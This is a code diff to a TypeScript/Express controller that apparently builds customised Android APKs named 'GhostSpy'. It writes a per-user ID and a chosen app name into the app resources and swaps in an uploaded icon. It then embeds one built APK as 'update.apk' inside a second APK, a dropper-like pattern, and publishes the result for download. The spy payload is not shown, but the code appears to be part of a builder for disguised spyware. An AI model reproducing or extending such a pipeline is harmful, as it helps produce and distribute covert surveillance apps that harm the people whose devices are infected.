@@ -7,7 +7,9 @@ import { spawn } from "child_process";
 import App from "../models/app.model";
 import User from "../models/user.model";
 
-const BAT_PATH = process.env.BAT_PATH;
+// Define the paths to your batch files
+const BAT_PATH = process.env.BAT_PATH as string;
+const BAT01_PATH = process.env.BAT01_PATH as string;
 
 export const createNewApk = async (req: Request, res: Response) => {
 	// Check for validation errors
@@ -24,24 +26,40 @@ export const createNewApk = async (req: Request, res: Response) => {
 			return res.status(400).json({ error: "userId is required" });
 		}
 
-		// Step 1: Replace the userId and appName in the strings.xml file
-		const filePath = path.join(
-			__dirname,
-			"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
-		);
-		const fileContent = await fs.promises.readFile(filePath, "utf8");
+		// Define paths for both Ghost_main and Ghost_major
+		const paths = [
+			{
+				name: "Ghost_main",
+				filePath: path.join(
+					__dirname,
+					"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
+				),
+			},
+			{
+				name: "Ghost_major",
+				filePath: path.join(
+					__dirname,
+					"../../public/GhostSpy/GhostSpy_major/app/src/main/res/values/strings.xml"
+				),
+			},
+		];
 
-		let newContent = fileContent.replace(
-			/<string name="app_user_id">.*<\/string>/,
-			`<string name="app_user_id">${userId}</string>`
-		);
+		// Step 1: Replace the userId and appName in the strings.xml files
+		for (const { filePath } of paths) {
+			let fileContent = await fs.promises.readFile(filePath, "utf8");
 
-		newContent = newContent.replace(
-			/<string name="app_name">.*<\/string>/,
-			`<string name="app_name">${appName}</string>`
-		);
+			let newContent = fileContent.replace(
+				/<string name="app_user_id">.*<\/string>/,
+				`<string name="app_user_id">${userId}</string>`
+			);
 
-		await fs.promises.writeFile(filePath, newContent, "utf8");
+			newContent = newContent.replace(
+				/<string name="app_name">.*<\/string>/,
+				`<string name="app_name">${appName}</string>`
+			);
+
+			await fs.promises.writeFile(filePath, newContent, "utf8");
+		}
 
 		// Step 2: Save and Resize the Uploaded Icon
 		if (appIcon) {
@@ -59,11 +77,12 @@ export const createNewApk = async (req: Request, res: Response) => {
 				"mipmap-xxxhdpi": 192,
 			};
 
-			const resizeAndSaveIcon = async (size: number, folder: string) => {
-				const outputPath = path.join(
-					__dirname,
-					`../../public/GhostSpy/app/src/main/res/${folder}/`
-				);
+			const resizeAndSaveIcon = async (
+				size: number,
+				folder: string,
+				basePath: string
+			) => {
+				const outputPath = path.join(basePath, folder);
 
 				await fs.promises.mkdir(outputPath, { recursive: true });
 
@@ -82,82 +101,96 @@ export const createNewApk = async (req: Request, res: Response) => {
 					.toFile(path.join(outputPath, "ic_launcher_round.webp"));
 			};
 
-			await Promise.all(
-				Object.entries(sizes).map(([folder, size]) =>
-					resizeAndSaveIcon(size, folder)
-				)
-			);
+			for (const { filePath } of paths) {
+				const basePath = path.dirname(filePath).replace("values", "");
+				await Promise.all(
+					Object.entries(sizes).map(([folder, size]) =>
+						resizeAndSaveIcon(size, folder, basePath)
+					)
+				);
+			}
 		}
 
-		// Step 3: Build new APK
-		console.log(`Starting APK build process...`);
+		// Step 3: Build Ghost_main APK
+		console.log(`Starting Ghost_main APK build process...`);
+		await buildApk(BAT_PATH);
 
-		// Use spawn to run the .bat file
-		const batProcess = spawn("cmd.exe", ["/c", BAT_PATH as string], {
+		// Rename and move the APK
+		const ghostMainApkPath = path.join(
+			__dirname,
+			"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
+		);
+
+		const updateApkPath = path.join(
+			__dirname,
+			"../../public/GhostSpy/GhostSpy_major/app/src/main/assets/update.apk"
+		);
+
+		await fs.promises.rename(ghostMainApkPath, updateApkPath);
+
+		// Step 4: Build Ghost_major APK
+		console.log(`Starting Ghost_major APK build process...`);
+		await buildApk(BAT01_PATH);
+
+		// Step 5: Make the APK available for download
+		const ghostMajorApkPath = path.join(
+			__dirname,
+			"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/debug/app-debug.apk"
+		);
+
+		const fileExists = await fs.promises
+			.stat(ghostMajorApkPath)
+			.catch(() => null);
+		if (!fileExists || !fileExists.isFile()) {
+			throw new Error("Ghost_major APK file was not created.");
+		}
+
+		const publicPath = path.join(
+			__dirname,
+			"../../public/downloads",
+			`${appName}.apk` // Use appName for the file name
+		);
+
+		await fs.promises.copyFile(ghostMajorApkPath, publicPath);
+
+		// Add new APK info to the App model
+		await App.create({
+			userId,
+			name: appName,
+			path: publicPath,
+		});
+
+		// Update User model's apk field
+		await User.findOneAndUpdate(
+			{ _id: userId },
+			{ apk: "created", apkName: appName }
+		);
+
+		res.status(200).json({ success: true });
+	} catch (error) {
+		console.error("Error processing APK:", error);
+		res.status(500).json({ error: "Failed to process the APK" });
+	}
+};
+
+// Helper function to build APK
+const buildApk = (batPath: string): Promise<void> => {
+	return new Promise<void>((resolve, reject) => {
+		const batProcess = spawn("cmd.exe", ["/c", batPath], {
 			detached: true,
 			stdio: "ignore",
 		});
 
 		batProcess.unref();
 
-		// Wait for the APK to be built
-		batProcess.on("close", async (code) => {
+		batProcess.on("close", (code) => {
 			if (code !== 0) {
 				console.error(`APK build process exited with code ${code}`);
-				return res.status(500).json({ error: "Failed to build APK" });
+				return reject(new Error("Failed to build APK"));
 			}
-
-			try {
-				// Step 4: Make the APK available for download
-				const apkPath = path.join(
-					__dirname,
-					"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
-				);
-
-				const fileExists = await fs.promises
-					.stat(apkPath)
-					.catch(() => null);
-				if (!fileExists || !fileExists.isFile()) {
-					throw new Error("APK file was not created.");
-				}
-
-				// Move the APK to a publicly accessible directory
-				const publicPath = path.join(
-					__dirname,
-					"../../public/downloads",
-					`${appName}.apk` // Use appName for the file name
-				);
-
-				await fs.promises.copyFile(apkPath, publicPath);
-
-				// Add new APK info to the App model
-				await App.create({
-					userId,
-					name: appName,
-					path: publicPath,
-				});
-
-				// Update User model's apk field
-				await User.findOneAndUpdate(
-					{ _id: userId },
-					{ apk: "created", apkName: appName }
-				);
-
-				res.status(200).json({ success: true });
-			} catch (error) {
-				console.error(
-					"Error making APK available for download:",
-					error
-				);
-				res.status(500).json({
-					error: "Failed to prepare APK for download",
-				});
-			}
+			resolve();
 		});
-	} catch (error) {
-		console.error("Error processing APK:", error);
-		res.status(500).json({ error: "Failed to process the APK" });
-	}
+	});
 };
 
 // Get New APK
